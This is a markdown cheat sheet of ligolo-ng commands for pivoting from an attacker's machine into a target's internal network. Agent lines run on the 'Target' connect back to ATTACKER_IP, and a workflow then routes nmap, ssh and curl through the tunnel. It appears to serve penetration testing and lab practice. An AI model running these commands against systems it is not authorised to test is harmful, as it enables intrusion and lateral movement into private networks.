---
title: "ligolo-ng CHEATSHEET"
description: "Quick reference for ligolo-ng tunneling commands"
---

# ligolo-ng CHEATSHEET

## Proxy (Attacker)

```bash
# Start with self-signed cert
sudo ./proxy -selfcert

# Start with custom cert
sudo ./proxy -certfile cert.pem -keyfile key.pem

# Start on custom port
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# WebSocket mode
sudo ./proxy -selfcert -wss -laddr 0.0.0.0:443
```

## Agent (Target)

```bash
# Basic connection
./agent -connect ATTACKER_IP:11601 -ignore-cert

# With custom ID
./agent -connect ATTACKER_IP:11601 -ignore-cert -id agent1

# With custom interface name
./agent -connect ATTACKER_IP:11601 -ignore-cert -ifname myagent
```

## TUN Interface Setup

```bash
# Create TUN interface (on proxy)
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring up
sudo ip link set ligolo up

# Add route to target network
sudo ip route add 10.10.10.0/24 dev ligolo

# Multiple routes
sudo ip route add 192.168.1.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo

# Verify
ip addr show ligolo
ip route show
```

## Interactive Commands

```
# List agents
proxy> session

# Start tunnel
ligolo-ng> start

# Stop tunnel
ligolo-ng> stop

# Show interface config
ligolo-ng> ifconfig

# Add listener
ligolo-ng> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp

# Remove listener
ligolo-ng> listener_del ID
```

## Practical Workflow

```bash
# 1. Start proxy
sudo ./proxy -selfcert

# 2. Setup interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 3. Run agent on target
./agent -connect ATTACKER_IP:11601 -ignore-cert

# 4. Add route
sudo ip route add 10.10.10.0/24 dev ligolo

# 5. Start tunnel (in interactive session)
proxy> session
ligolo-ng> start

# 6. Use tools directly (no proxychains needed!)
nmap -sT 10.10.10.0/24
ssh user@10.10.10.5
curl http://10.10.10.10
```

## Common Flags

### Proxy Flags

| Flag | Description |
|------|-------------|
| `-selfcert` | Use self-signed certificate |
| `-certfile FILE` | TLS certificate |
| `-keyfile FILE` | TLS key |
| `-laddr ADDR` | Listen address (default: 0.0.0.0:11601) |
| `-wss` | WebSocket mode |

### Agent Flags

| Flag | Description |
|------|-------------|
| `-connect ADDR` | Proxy address |
| `-ignore-cert` | Accept self-signed cert |
| `-id ID` | Agent identifier |
| `-ifname NAME` | Interface name |
| `-retry` | Auto-retry connection |

## Troubleshooting

```bash
# Check TUN interface
ip link show ligolo

# Check routes
ip route show | grep ligolo

# Check agent connection
netstat -anp | grep 11601

# Restart proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Test connectivity
ping 10.10.0.1
```
